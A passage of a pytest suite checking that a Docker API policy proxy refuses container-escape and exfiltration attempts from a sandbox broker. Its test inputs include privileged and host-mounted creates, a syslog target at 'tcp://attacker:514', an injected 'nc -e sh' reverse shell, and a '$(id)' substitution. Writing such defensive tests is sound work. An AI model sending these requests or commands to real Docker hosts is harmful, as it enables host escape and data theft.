"""R38IDENT-FU-1 (SEC-D-02 fix 3): the sandbox broker's profile of the Docker API policy proxy.

The broker no longer holds the Docker socket; every call it makes goes through ``app.sandbox.docker_proxy`` with its own
credential and is held to ``app.sandbox.docker_proxy_broker.BrokerApiPolicy``. These tests derive the allowlist from the
broker's code (every docker-py call its modules make has a route, and nothing else does), hold the broker's own create
shapes to it, and try the shapes an attacker in the broker would send next.
"""

from __future__ import annotations

import ast
import asyncio
import json
import secrets
import shutil
import tempfile
from pathlib import Path
from typing import TYPE_CHECKING, Any

import pytest

from app.agent_loop_lib.sandbox.coding.egress_firewall import (
    build_firewall_rules_script,
)
from app.harness.sandbox.docker_policy import EGRESS_NETWORK_OPTIONS, SANDBOX_USER
from app.sandbox.docker_proxy import (
    ENV_BROKER_CALLER_TOKEN,
    ENV_CALLER_TOKEN,
    MANAGED_LABEL,
    DockerApiPolicy,
    DockerSocketProxy,
    PolicyDenied,
    proxy_callers,
)
from app.sandbox.docker_proxy_broker import (
    STAMP_LABEL,
    BrokerApiPolicy,
    BrokerScope,
    InstallIdUnset,
)

if TYPE_CHECKING:
    from collections.abc import AsyncIterator

APP = Path(__file__).resolve().parents[3] / "app"
INSTALL = "pxh-test"
NS = "io.pipeshub.sandbox-broker"
OWN = {f"{NS}.managed": "1", f"{NS}.install": INSTALL}
OTHER = {f"{NS}.managed": "1", f"{NS}.install": "someone-else"}
PROXY_CONTAINER = f"{INSTALL}-egress-proxy-1"
IMAGE = "pipeshubai/pipeshub-sandbox:latest"
BROKER_TOKEN = secrets.token_hex(32)
LEGACY_TOKEN = secrets.token_hex(32)


def _policy() -> BrokerApiPolicy:
    return BrokerApiPolicy(BrokerScope(install=INSTALL, proxy_container=PROXY_CONTAINER, firewall_image=IMAGE))


def _host(**over: object) -> dict[str, Any]:
    host: dict[str, Any] = {
        "Memory": 256 * 2**20, "MemorySwap": 256 * 2**20, "NanoCpus": 500_000_000, "PidsLimit": 64,
        "ReadonlyRootfs": True, "CapDrop": ["ALL"], "SecurityOpt": ["no-new-privileges:true"], "NetworkMode": "none",
        "Init": True, "Tmpfs": {"/tmp": "size=64m"},
        "Ulimits": [{"Name": "core", "Soft": 0, "Hard": 0}],
        "Mounts": [
            {"Type": "volume", "Source": "pipeshub_sandbox_data", "Target": "/work", "ReadOnly": False,
             "VolumeOptions": {"Subpath": f"{INSTALL}/org/sess", "NoCopy": True}},
            {"Type": "volume", "Source": "pipeshub-sbx-sbx1-1", "Target": "/scratch", "ReadOnly": False,
             "VolumeOptions": {"NoCopy": True}},
        ],
    }
    host.update(over)
    return host


def _create(host: dict[str, Any] | None = None, **over: object) -> dict[str, Any]:
    body: dict[str, Any] = {
        "Image": IMAGE, "Cmd": ["/bin/sh", "-c", "while :; do sleep 3600; done"], "User": SANDBOX_USER,
        "WorkingDir": "/work", "Hostname": "sandbox", "Labels": {**OWN, f"{NS}.role": "sandbox"},
        "HostConfig": host if host is not None else _host(), "NetworkDisabled": None, "NetworkingConfig": None,
        "AttachStdout": True, "AttachStderr": True, "Volumes": None, "Runtime": None,
    }
    body.update(over)
    return body


def _container(ident: str, labels: dict[str, str], *, stamped: bool = True, host: dict[str, Any] | None = None,
               user: str = SANDBOX_USER, name: str | None = None) -> dict[str, Any]:
    tags = {**labels, **({STAMP_LABEL: INSTALL} if stamped else {})}
    return {"Id": ident, "Name": f"/{name or ident}", "Config": {"Labels": tags, "User": user, "Image": IMAGE},
            "HostConfig": host if host is not None else _host()}


class FakeDaemon:
    """A unix-socket daemon with containers, execs, volumes and networks to look up; it records what it is asked and
    answers an exec start with 101 and an echo of the client's bytes."""

    def __init__(self) -> None:
        self.containers: dict[str, dict[str, Any]] = {}
        self.execs: dict[str, dict[str, Any]] = {}
        self.volumes: dict[str, dict[str, Any]] = {}
        self.networks: dict[str, dict[str, Any]] = {}
        self.requests: list[tuple[str, str, bytes]] = []

    def add(self, info: dict[str, Any]) -> None:
        self.containers[info["Id"]] = info
        self.containers[info["Name"].lstrip("/")] = info

    async def handle(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        head = (await reader.readuntil(b"\r\n\r\n")).decode()
        method, target, _ = head.split("\r\n")[0].split(" ")
        length = 0
        for line in head.split("\r\n")[1:]:
            if line.lower().startswith("content-length:"):
                length = int(line.split(":", 1)[1])
        body = await reader.readexactly(length) if length else b""
        self.requests.append((method, target, body))
        path = target.split("?", 1)[0]
        parts = path.split("/")
        if method == "POST" and path.endswith("/start") and "/exec/" in path:
            writer.write(b"HTTP/1.1 101 UPGRADED\r\nConnection: Upgrade\r\nUpgrade: tcp\r\n\r\n")
            while chunk := await reader.read(1024):
                writer.write(b"echo:" + chunk)
                await writer.drain()
            writer.close()
            return
        found: object = None
        if method == "GET" and "containers" in parts and path.endswith("/json") and parts[-2] != "containers":
            found = self.containers.get(parts[-2])
        elif method == "GET" and "exec" in parts and path.endswith("/json"):
            found = self.execs.get(parts[-2])
        elif method == "GET" and len(parts) >= 2 and parts[-2] == "volumes":
            found = self.volumes.get(parts[-1])
        elif method == "GET" and len(parts) >= 2 and parts[-2] == "networks":
            found = self.networks.get(parts[-1])
        else:
            found = {"ok": True}
        payload = json.dumps(found).encode() if found is not None else b'{"message":"not found"}'
        status = "200 OK" if found is not None else "404 Not Found"
        writer.write(f"HTTP/1.1 {status}\r\nContent-Length: {len(payload)}\r\n\r\n".encode() + payload)
        await writer.drain()
        writer.close()


@pytest.fixture
async def proxied() -> AsyncIterator[tuple[FakeDaemon, int]]:
    daemon = FakeDaemon()
    daemon.add(_container("a" * 64, {**OWN, f"{NS}.role": "sandbox"}, name="pipeshub-sbx-sbx-sbx1"))
    daemon.add(_container("b" * 64, {**OWN, f"{NS}.role": "sandbox"}, stamped=False, name="pipeshub-sbx-sbx-old"))
    daemon.add(_container("c" * 64, {**OWN}, stamped=False, host=_host(Privileged=True), name="pipeshub-sbx-sbx-bad"))
    daemon.add(_container("d" * 64, OTHER, name="pipeshub-sbx-sbx-theirs"))
    daemon.add(_container("e" * 64, {}, user="0", name="pxh-test-pipeshub-ai-1"))
    daemon.add(_container("f" * 64, {}, user="1000:1000", name=PROXY_CONTAINER))
    daemon.add({**_container("9" * 64, {MANAGED_LABEL: "true"}, name="legacy-run")})
    daemon.execs = {
        "ownexec": {"ContainerID": "a" * 64, "ProcessConfig": {"user": SANDBOX_USER, "privileged": False}},
        "rootexec": {"ContainerID": "a" * 64, "ProcessConfig": {"user": "0", "privileged": False}},
        "appexec": {"ContainerID": "e" * 64, "ProcessConfig": {"user": SANDBOX_USER, "privileged": False}},
    }
    daemon.volumes = {
        "pipeshub-sbx-sbx1-1": {"Name": "pipeshub-sbx-sbx1-1", "Labels": OWN},
        "pipeshub-sbx-theirs-1": {"Name": "pipeshub-sbx-theirs-1", "Labels": OTHER},
        "pipeshub_sandbox_data": {"Name": "pipeshub_sandbox_data", "Labels": None},
        "pxh-test_mongodb_data": {"Name": "pxh-test_mongodb_data", "Labels": None},
    }
    own_net = {"Name": "pipeshub-sbx-net-sbx1", "Labels": OWN}
    daemon.networks = {
        "pipeshub-sbx-net-sbx1": own_net, "ownnetid": own_net,
        "pipeshub-sbx-net-theirs": {"Name": "pipeshub-sbx-net-theirs", "Labels": OTHER},
        "pxh-test_pipeshub": {"Name": "pxh-test_pipeshub", "Labels": {"com.docker.compose.project": INSTALL}},
        "none": {"Name": "none", "Labels": {}},
        "pipeshub_sandbox_egress": {"Name": "pipeshub_sandbox_egress", "Labels": {}},
    }
    sock_dir = tempfile.mkdtemp(prefix="dproxyb-", dir="/tmp")
    sock = f"{sock_dir}/d.sock"
    upstream = await asyncio.start_unix_server(daemon.handle, sock)
    legacy = DockerApiPolicy(allowed_images=frozenset({IMAGE}), allowed_networks=frozenset({"pipeshub_sandbox_egress"}))
    proxy = DockerSocketProxy(None, sock, callers={BROKER_TOKEN: _policy(), LEGACY_TOKEN: legacy})
    server = await asyncio.start_server(proxy.handle, "127.0.0.1", 0)
    try:
        yield daemon, server.sockets[0].getsockname()[1]
    finally:
        server.close()
        upstream.close()
        shutil.rmtree(sock_dir, ignore_errors=True)


async def _call(port: int, method: str, target: str, body: object = None, *, token: str = BROKER_TOKEN) -> bytes:
    data = b"" if body is None else json.dumps(body).encode()
    head = f"{method} /v1.43{target} HTTP/1.1\r\nHost: d\r\nAuthorization: Bearer {token}\r\n"
    if body is not None:
        head += f"Content-Type: application/json\r\nContent-Length: {len(data)}\r\n"
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    writer.write(head.encode() + b"\r\n" + data)
    await writer.drain()
    answer = await reader.read()
    writer.close()
    return answer


def _status(answer: bytes) -> int:
    return int(answer.split(b" ", 2)[1])


def _sent(daemon: FakeDaemon) -> tuple[str, str, bytes]:
    return daemon.requests[-1]


# -- the allowlist is the broker's code ---------------------------------------------------------------------------

# Every docker-py method the broker process calls, and one request it sends for it. A call the broker starts making
# needs a row here, so its route is decided in review, not discovered as a 403 on a lane.
BROKER_CALLS: dict[str, tuple[str, str]] = {
    "api_version": ("GET", "/version"),
    "version": ("GET", "/version"),
    "info": ("GET", "/info"),
    "ping": ("GET", "/_ping"),
    "containers": ("GET", "/containers/json"),
    "create_container": ("POST", "/containers/create"),
    "inspect_container": ("GET", "/containers/x/json"),
    "start": ("POST", "/containers/x/start"),
    "wait": ("POST", "/containers/x/wait"),
    "kill": ("POST", "/containers/x/kill"),
    "rename": ("POST", "/containers/x/rename"),
    "remove_container": ("DELETE", "/containers/x"),
    "logs": ("GET", "/containers/x/logs"),
    "put_archive": ("PUT", "/containers/x/archive"),
    "get_archive": ("GET", "/containers/x/archive"),
    "exec_create": ("POST", "/containers/x/exec"),
    "exec_start": ("POST", "/exec/x/start"),
    "exec_inspect": ("GET", "/exec/x/json"),
    "create_volume": ("POST", "/volumes/create"),
    "volumes": ("GET", "/volumes"),
    "remove_volume": ("DELETE", "/volumes/x"),
    "networks": ("GET", "/networks"),
    "inspect_network": ("GET", "/networks/x"),
    "create_network": ("POST", "/networks/create"),
    "remove_network": ("DELETE", "/networks/x"),
    "connect_container_to_network": ("POST", "/networks/x/connect"),
    "disconnect_container_from_network": ("POST", "/networks/x/disconnect"),
    "inspect_image": ("GET", "/images/x/json"),
    "get": ("GET", "/images/x/json"),
    "pull": ("POST", "/images/create?fromImage=x&tag=1"),
    "get_registry_data": ("GET", "/distribution/x/json"),
    "list": ("GET", "/networks"),
    "create": ("POST", "/networks/create"),
    "remove": ("DELETE", "/networks/x"),
}
# Builders that send nothing (they shape a request body), and the client's own lifecycle.
_NOT_CALLS = {"create_host_config", "create_networking_config", "create_endpoint_config", "headers", "close", "attrs",
              "id", "api"}
# The modules the broker process runs Docker calls from.
BROKER_MODULES = ("harness/sandbox/docker_broker.py", "harness/sandbox/docker_egress.py",
                  "harness/sandbox/image_binaries.py", "harness/sandbox/engine_images.py",
                  "harness/sandbox/docker_client.py")


def _docker_calls(source: str) -> set[str]:
    """Attribute names called on docker-py objects: ``….api.<m>``, ``client.<m>``, ``….images.<m>`` and the
    network objects ``ensure_egress_network_sync`` handles."""
    found: set[str] = set()
    for node in ast.walk(ast.parse(source)):
        if not isinstance(node, ast.Attribute):
            continue
        owner = node.value
        owner_name = owner.attr if isinstance(owner, ast.Attribute) else owner.id if isinstance(owner, ast.Name) else ""
        if owner_name in ("api", "_api") or (isinstance(owner, ast.Call) and getattr(owner.func, "attr", "") == "_api"):
            found.add(node.attr)
        elif owner_name in ("images", "networks", "volumes") and isinstance(owner, ast.Attribute):
            found.add(node.attr)
        elif owner_name == "client" and node.attr in ("version", "info", "ping"):
            found.add(node.attr)
    return found


def test_every_docker_call_the_broker_makes_has_a_route() -> None:
    used: set[str] = set()
    for module in BROKER_MODULES:
        used |= _docker_calls((APP / module).read_text(encoding="utf-8"))
    egress = (APP / "agent_loop_lib/sandbox/coding/egress_firewall.py").read_text(encoding="utf-8")
    fn = ast.get_source_segment(egress, next(
        n for n in ast.walk(ast.parse(egress)) if isinstance(n, ast.FunctionDef) and n.name == "ensure_egress_network_sync"
    ))
    used |= _docker_calls(fn or "") | {"remove"}
    assert used - _NOT_CALLS <= set(BROKER_CALLS), sorted(used - _NOT_CALLS - set(BROKER_CALLS))
    policy = _policy()
    for name, (method, target) in BROKER_CALLS.items():
        policy.route(method, "/v1.43" + target)  # raises PolicyDenied for a call with no route
        assert name


@pytest.mark.parametrize(("method", "target"), [
    ("POST", "/containers/x/exec/../../start"), ("POST", "/containers/x/update"), ("POST", "/containers/x/commit"),
    ("POST", "/containers/x/attach"), ("GET", "/containers/x/export"), ("POST", "/containers/x/pause"),
    ("POST", "/containers/x/restart"), ("POST", "/containers/prune"), ("POST", "/images/load"), ("POST", "/build"),
    ("POST", "/images/x/push"), ("POST", "/images/x/tag"), ("DELETE", "/images/x"), ("POST", "/commit"),
    ("POST", "/exec/x/resize"), ("POST", "/volumes/prune"), ("POST", "/networks/prune"), ("GET", "/events"),
    ("POST", "/swarm/init"), ("POST", "/plugins/pull"), ("GET", "/secrets"), ("POST", "/session"),
    ("POST", "/images/create?fromSrc=-"), ("POST", "/images/create?fromImage=x&repo=y"), ("POST", "/images/create"),
    ("POST", "/auth"), ("GET", "/system/df"), ("HEAD", "/containers/x/json"),
])
def test_calls_the_broker_never_makes_are_refused(method: str, target: str) -> None:
    with pytest.raises(PolicyDenied):
        _policy().route(method, "/v1.43" + target)


# -- creates --------------------------------------------------------------------------------------------------------

async def test_the_brokers_sandbox_create_is_admitted_and_stamped(proxied) -> None:
    daemon, port = proxied
    answer = await _call(port, "POST", "/containers/create?name=pipeshub-sbx-sbx-sbx9", _create())
    assert _status(answer) == 200, answer
    sent = json.loads(_sent(daemon)[2])
    assert sent["Labels"][STAMP_LABEL] == INSTALL
    assert sent["HostConfig"]["LogConfig"] == {"Type": "local", "Config": {}}


@pytest.mark.parametrize("over", [
    {"Privileged": True},
    {"Binds": ["/:/host"]},
    {"NetworkMode": "host"},
    {"NetworkMode": "pxh-test_pipeshub"},
    {"NetworkMode": "container:" + "e" * 64},
    {"PidMode": "host"},
    {"IpcMode": "host"},
    {"UsernsMode": "host"},
    {"CgroupnsMode": "host"},
    {"CapAdd": ["SYS_ADMIN"]},
    {"CapAdd": ["NET_ADMIN"]},
    {"Devices": [{"PathOnHost": "/dev/sda", "PathInContainer": "/dev/sda", "CgroupPermissions": "rwm"}]},
    {"DeviceRequests": [{"Count": -1, "Capabilities": [["gpu"]]}]},
    {"SecurityOpt": ["seccomp=unconfined", "no-new-privileges:true"]},
    {"SecurityOpt": ["apparmor=unconfined"]},
    {"ReadonlyRootfs": False},
    {"PidsLimit": 0},
    {"MemorySwap": -1},
    {"CapDrop": []},
    {"Runtime": "io.containerd.runc.v2"},
    {"RestartPolicy": {"Name": "always"}},
    {"LogConfig": {"Type": "syslog", "Config": {"syslog-address": "tcp://attacker:514"}}},
    {"PortBindings": {"22/tcp": [{"HostPort": "2222"}]}},
    {"Sysctls": {"net.ipv4.ip_forward": "1"}},
    {"CgroupParent": "/"},
    {"OomKillDisable": True},
    {"Isolation": "hyperv"},
    {"Annotations": {"dev.gvisor.flag.net-raw": "true"}},
    {"networkmode": "host"},
    {"NetworkMode": "none", "Networkmode": "host"},
    {"Mounts": [{"Type": "bind", "Source": "/", "Target": "/host"}]},
    {"Mounts": [{"Type": "volume", "Source": "pxh-test_mongodb_data", "Target": "/m"}]},
    {"Mounts": [{"Type": "volume", "Source": "pipeshub-sbx-x", "Target": "/m",
                 "VolumeOptions": {"DriverConfig": {"Name": "local", "Options": {"o": "bind", "device": "/"}}}}]},
    {"Mounts": [{"Type": "volume", "Source": "pipeshub_sandbox_data", "Target": "/m",
                 "VolumeOptions": {"Subpath": "../../.."}}]},
    {"Mounts": [{"Type": "volume", "Source": "pipeshub_sandbox_data", "Target": "/m",
                 "VolumeOptions": {"Subpath": "/etc"}}]},
    {"Mounts": [{"Type": "image", "Source": "alpine", "Target": "/m"}]},
    {"Mounts": [{"Type": "volume", "Source": "pipeshub-sbx-x", "Target": "/m", "BindOptions": {"Propagation": "rshared"}}]},
    {"Mounts": [{"type": "bind", "Source": "/", "Target": "/host"}]},
])
async def test_a_create_that_reaches_the_host_is_refused(proxied, over: dict[str, object]) -> None:
    daemon, port = proxied
    before = len(daemon.requests)
    answer = await _call(port, "POST", "/containers/create", _create(_host(**over)))
    assert _status(answer) == 403, (over, answer)
    assert not [r for r in daemon.requests[before:] if r[1].split("?")[0].endswith("/containers/create")]


@pytest.mark.parametrize("over", [
    {"User": "0"}, {"User": "root"}, {"User": ""}, {"User": None}, {"User": "0:0"}, {"User": "1001:1001"},
    {"Labels": {f"{NS}.managed": "1"}}, {"Labels": OTHER}, {"Labels": None},
    {"Volumes": {"/v": {}}}, {"Runtime": "runsc"}, {"Domainname": "x", "domainname": "y"},
    {"Image": IMAGE, "Unknown": 1},
])
async def test_a_create_outside_the_brokers_shape_is_refused(proxied, over: dict[str, object]) -> None:
    _, port = proxied
    assert _status(await _call(port, "POST", "/containers/create", _create(**over))) == 403, over


async def test_a_create_is_named_under_the_brokers_prefix(proxied) -> None:
    _, port = proxied
    assert _status(await _call(port, "POST", "/containers/create?name=pxh-human-ht1-pipeshub-ai-1", _create())) == 403
    assert _status(await _call(port, "POST", "/containers/create?name=pipeshub-sbx-x&fromImage=y", _create())) == 403


async def test_duplicate_keys_in_a_create_are_refused(proxied) -> None:
    _, port = proxied
    raw = json.dumps(_create()).replace('"Privileged"', '"X"')
    raw = raw[:-1] + ', "HostConfig": {"Privileged": true}}'
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    head = (f"POST /v1.43/containers/create HTTP/1.1\r\nHost: d\r\nAuthorization: Bearer {BROKER_TOKEN}\r\n"
            f"Content-Length: {len(raw)}\r\n\r\n")
    writer.write(head.encode() + raw.encode())
    await writer.drain()
    assert _status(await reader.read()) == 403
    writer.close()


_RULES_SCRIPT = build_firewall_rules_script(["10.212.0.0/22"], ["10.250.0.7/32"], token="ab" * 8)


def _firewall_helper(sandbox: str, caps: list[str], **body: Any) -> dict[str, Any]:  # noqa: ANN401
    host = _host(CapAdd=caps, NetworkMode=f"container:{sandbox}", Mounts=None, Ulimits=None,
                 Tmpfs={"/run": "size=1m"})
    fields = {"User": "0", "Entrypoint": [], "Cmd": ["sh", "-c", _RULES_SCRIPT, "egress-firewall"],
              "Labels": {**OWN, f"{NS}.role": "firewall"}, **body}
    return _create(host, **fields)


async def test_the_firewall_helper_is_root_only_in_a_sandbox_of_the_install(proxied) -> None:
    daemon, port = proxied
    helper = _firewall_helper

    assert _status(await _call(port, "POST", "/containers/create", helper("a" * 64, ["NET_ADMIN"]))) == 200
    assert json.loads(_sent(daemon)[2])["Labels"][STAMP_LABEL] == INSTALL
    for sandbox, caps in (("e" * 64, ["NET_ADMIN"]), ("d" * 64, ["NET_ADMIN"]), ("c" * 64, ["NET_ADMIN"]),
                          ("a" * 64, ["NET_ADMIN", "SYS_ADMIN"]), ("a" * 64, ["NET_RAW"]), ("a" * 64, ["ALL"])):
        assert _status(await _call(port, "POST", "/containers/create", helper(sandbox, caps))) == 403, (sandbox, caps)


# R43SOCK-FU-4: the helper runs as root with NET_ADMIN, so only the rules script the broker writes gets through.
_HELPER_BYPASSES = {
    "a command after the rules": {"Cmd": ["sh", "-c", _RULES_SCRIPT.replace("exit 0\n", "nc -e sh x 1\nexit 0\n"),
                                          "egress-firewall"]},
    "a flush instead of a rule": {"Cmd": ["sh", "-c", _RULES_SCRIPT.replace("r -A OUTPUT -o lo -j ACCEPT",
                                                                            "r -F OUTPUT"), "egress-firewall"]},
    "a substitution in a rule": {"Cmd": ["sh", "-c", _RULES_SCRIPT.replace("10.250.0.7/32", "$(id)/32"),
                                         "egress-firewall"]},
    "an IPv6 rule": {"Cmd": ["sh", "-c", _RULES_SCRIPT.replace("10.250.0.7/32", "::/0"), "egress-firewall"]},
    "the legacy script's drop to a user": {"Cmd": ["sh", "-c", "set -u\nexec sh", "egress-firewall"]},
    "an argument after the script": {"Cmd": ["sh", "-c", _RULES_SCRIPT, "egress-firewall", "x"]},
    "bash instead of sh": {"Cmd": ["bash", "-c", _RULES_SCRIPT, "egress-firewall"]},
    "a command string": {"Cmd": "sh -c id"},
    "no command": {"Cmd": None},
    "the image's entrypoint": {"Entrypoint": None},
    "an entrypoint of its own": {"Entrypoint": ["/bin/sh", "-c", "id"]},
    "an environment": {"Env": ["PATH=/tmp"]},
}


# R44STOP-FU-3: from an image of a foothold's own making, the helper's `sh` is that image's: only the broker's pinned
# sandbox image runs it.
@pytest.mark.parametrize(
    "image",
    ["attacker/firewall:latest", "pipeshubai/pipeshub-sandbox:other", f"pipeshubai/pipeshub-sandbox@sha256:{'0' * 64}"],
)
async def test_the_firewall_helper_runs_only_from_the_pinned_image(proxied, image: str) -> None:
    _, port = proxied
    assert _status(await _call(port, "POST", "/containers/create", _firewall_helper("a" * 64, ["NET_ADMIN"],
                                                                                  Image=image))) == 403


def test_the_profile_reads_the_firewall_image_from_the_brokers_variable() -> None:
    pinned = f"pipeshubai/pipeshub-sandbox:1.2.3@sha256:{'1' * 64}"
    assert BrokerScope.from_env({"SANDBOX_INSTALL_ID": INSTALL, "SANDBOX_DOCKER_IMAGE": pinned}).firewall_image == pinned
    assert BrokerScope.from_env({"SANDBOX_INSTALL_ID": INSTALL}).firewall_image == "pipeshub/sandbox:latest"


@pytest.mark.parametrize("bypass", list(_HELPER_BYPASSES))
async def test_the_firewall_helper_runs_only_the_rules_script(proxied, bypass: str) -> None:
    _, port = proxied
    body = _firewall_helper("a" * 64, ["NET_ADMIN"], **_HELPER_BYPASSES[bypass])
    assert _status(await _call(port, "POST", "/containers/create", body)) == 403


async def test_a_sandbox_joins_only_its_installs_networks(proxied) -> None:
    _, port = proxied

    def on(network: str) -> dict[str, Any]:
        return _create(_host(NetworkMode=network), NetworkingConfig={
            "EndpointsConfig": {network: {"IPAMConfig": {"IPv4Address": "10.213.0.3"}}}})

    assert _status(await _call(port, "POST", "/containers/create", on("pipeshub-sbx-net-sbx1"))) == 200
    assert _status(await _call(port, "POST", "/containers/create", on("pipeshub_sandbox_egress"))) == 200
    for network in ("pipeshub-sbx-net-theirs", "pipeshub-sbx-net-missing", "pxh-test_pipeshub", "bridge"):
        assert _status(await _call(port, "POST", "/containers/create", on(network))) in (403, 404), network


# -- acting on containers -------------------------------------------------------------------------------------------

@pytest.mark.parametrize(("method", "action"), [
    ("GET", "/json"), ("POST", "/kill"), ("POST", "/wait"), ("DELETE", ""), ("GET", "/logs"),
    ("POST", "/start"), ("PUT", "/archive?path=/w"), ("GET", "/archive?path=/w"),
])
async def test_only_the_installs_containers_are_touched(proxied, method: str, action: str) -> None:
    daemon, port = proxied
    assert _status(await _call(port, method, f"/containers/pipeshub-sbx-sbx-sbx1{action}")) == 200
    assert ("a" * 64) in _sent(daemon)[1]
    for foreign in ("pxh-test-pipeshub-ai-1", "pipeshub-sbx-sbx-theirs", "legacy-run", PROXY_CONTAINER):
        assert _status(await _call(port, method, f"/containers/{foreign}{action}")) == 403, (foreign, method)
    assert _status(await _call(port, method, f"/containers/gone{action}")) == 404


async def test_a_container_from_before_the_proxy_is_used_only_if_it_meets_the_rules(proxied) -> None:
    """The stamp migration: a warm sandbox the broker made while it held the socket carries no stamp."""
    _, port = proxied
    exec_body = {"User": SANDBOX_USER, "Privileged": False, "Cmd": ["true"], "AttachStdout": True}
    assert _status(await _call(port, "POST", "/containers/pipeshub-sbx-sbx-old/exec", exec_body)) == 200
    assert _status(await _call(port, "POST", "/containers/pipeshub-sbx-sbx-bad/exec", exec_body)) == 403
    assert _status(await _call(port, "PUT", "/containers/pipeshub-sbx-sbx-bad/archive?path=/")) == 403
    # Still the install's to stop and remove.
    assert _status(await _call(port, "DELETE", "/containers/pipeshub-sbx-sbx-bad?force=1")) == 200


async def test_removal_takes_anonymous_volumes_and_never_a_link(proxied) -> None:
    daemon, port = proxied
    assert _status(await _call(port, "DELETE", "/containers/pipeshub-sbx-sbx-sbx1?force=True&v=False")) == 200
    assert "v=1" in _sent(daemon)[1]
    assert _status(await _call(port, "DELETE", "/containers/pipeshub-sbx-sbx-sbx1?link=True")) == 403


async def test_a_rename_stays_under_the_prefix(proxied) -> None:
    _, port = proxied
    assert _status(await _call(port, "POST", "/containers/pipeshub-sbx-sbx-sbx1/rename?name=pipeshub-sbx-sbx-2")) == 200
    assert _status(await _call(port, "POST", "/containers/pipeshub-sbx-sbx-sbx1/rename?name=pxh-human-ht1-x")) == 403


async def test_list_calls_see_only_the_installs_objects(proxied) -> None:
    daemon, port = proxied
    for path in ("/containers/json?all=1&filters=%7B%22label%22%3A+%5B%22a%3D1%22%5D%7D", "/volumes",
                 "/containers/json?filters=%7B%22label%22%3A+%7B%22a%3D1%22%3A+true%7D%7D"):
        assert _status(await _call(port, "GET", path)) == 200
        query = _sent(daemon)[1].split("?", 1)[1]
        from urllib.parse import parse_qs

        labels = json.loads(parse_qs(query)["filters"][0])["label"]
        assert {f"{NS}.managed=1", f"{NS}.install={INSTALL}"} <= set(labels), labels
    assert _status(await _call(port, "GET", "/containers/json?filters=%5B%5D")) == 403


# -- exec -----------------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("over", [
    {"Privileged": True}, {"User": "0"}, {"User": "root"}, {"User": ""}, {"User": "0:1000"},
    {"user": "0"}, {"Unknown": 1},
])
async def test_an_exec_is_never_privileged_or_root(proxied, over: dict[str, object]) -> None:
    _, port = proxied
    body = {"User": SANDBOX_USER, "Privileged": False, "Cmd": ["id"], "AttachStdout": True, **over}
    assert _status(await _call(port, "POST", "/containers/pipeshub-sbx-sbx-sbx1/exec", body)) == 403, over


async def test_an_exec_is_only_in_the_installs_sandboxes(proxied) -> None:
    daemon, port = proxied
    body = {"User": SANDBOX_USER, "Privileged": False, "Cmd": ["id"], "Container": "pipeshub-sbx-sbx-sbx1"}
    assert _status(await _call(port, "POST", "/containers/pipeshub-sbx-sbx-sbx1/exec", body)) == 200
    assert json.loads(_sent(daemon)[2])["Container"] == "a" * 64
    for foreign in ("pxh-test-pipeshub-ai-1", "pipeshub-sbx-sbx-theirs", PROXY_CONTAINER):
        assert _status(await _call(port, "POST", f"/containers/{foreign}/exec", body)) == 403, foreign
    assert _status(await _call(port, "GET", "/exec/ownexec/json")) == 200
    assert _status(await _call(port, "GET", "/exec/appexec/json")) == 403
    assert _status(await _call(port, "POST", "/exec/rootexec/start", {"Detach": False})) == 403
    assert _status(await _call(port, "POST", "/exec/appexec/start", {"Detach": False})) == 403
    assert _status(await _call(port, "GET", "/exec/missing/json")) == 404


async def test_an_attached_exec_streams_both_ways_through_the_proxy(proxied) -> None:
    """``docker_exec.start_exec``: the upgrade is passed on, stdin goes up, the half-close is passed on, output comes
    back until the daemon closes."""
    _, port = proxied
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    body = b'{"Detach": false, "Tty": false}'
    writer.write(
        f"POST /v1.43/exec/ownexec/start HTTP/1.1\r\nHost: d\r\nAuthorization: Bearer {BROKER_TOKEN}\r\n"
        f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\nConnection: Upgrade\r\nUpgrade: tcp\r\n\r\n"
        .encode() + body
    )
    await writer.drain()
    status = await reader.readline()
    assert status.startswith(b"HTTP/1.1 101"), status
    while (await reader.readline()) not in (b"\r\n", b""):
        pass
    writer.write(b"hello")
    await writer.drain()
    assert await asyncio.wait_for(reader.readexactly(10), 5) == b"echo:hello"
    writer.write_eof()
    assert await asyncio.wait_for(reader.read(), 5) == b""
    writer.close()


async def test_the_exec_stream_carries_the_brokers_credential() -> None:
    from app.harness.sandbox.docker_exec import DockerEndpoint, start_exec

    seen: list[bytes] = []

    async def daemon(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        seen.append(await reader.readuntil(b"\r\n\r\n"))
        writer.write(b"HTTP/1.1 101 UPGRADED\r\n\r\n")
        await writer.drain()
        writer.close()

    server = await asyncio.start_server(daemon, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    try:
        endpoint = DockerEndpoint.resolve("1.43", f"tcp://127.0.0.1:{port}", authorization=f"Bearer {BROKER_TOKEN}")
        _, writer = await start_exec(endpoint, "x")
        writer.close()
    finally:
        server.close()
    assert f"Authorization: Bearer {BROKER_TOKEN}\r\n".encode() in seen[0]
    assert DockerEndpoint.resolve("1.43", "unix:///var/run/docker.sock", authorization="Bearer x").authorization is None


# -- volumes --------------------------------------------------------------------------------------------------------

def _volume(**over: object) -> dict[str, Any]:
    body: dict[str, Any] = {
        "Name": "pipeshub-sbx-sbx9-0", "Driver": "local",
        "DriverOpts": {"type": "tmpfs", "device": "tmpfs", "o": "size=64m,nr_inodes=1024,uid=0,gid=0,mode=1777"},
        "Labels": {**OWN, f"{NS}.role": "volume"},
    }
    body.update(over)
    return body


async def test_the_brokers_scratch_volume_is_admitted_and_stamped(proxied) -> None:
    daemon, port = proxied
    assert _status(await _call(port, "POST", "/volumes/create", _volume())) == 200
    assert json.loads(_sent(daemon)[2])["Labels"][STAMP_LABEL] == INSTALL
    assert _status(await _call(port, "POST", "/volumes/create", _volume(DriverOpts=None))) == 200


@pytest.mark.parametrize("over", [
    {"DriverOpts": {"type": "none", "device": "/", "o": "bind"}},
    {"DriverOpts": {"type": "tmpfs", "device": "tmpfs", "o": "size=1m,bind"}},
    {"DriverOpts": {"type": "tmpfs", "device": "/dev/sda", "o": "size=1m"}},
    {"DriverOpts": {"type": "nfs", "device": ":/export", "o": "addr=10.0.0.1"}},
    {"DriverOpts": {"type": "tmpfs", "device": "tmpfs", "o": "size=1m,uid=0,mode=1777", "extra": "x"}},
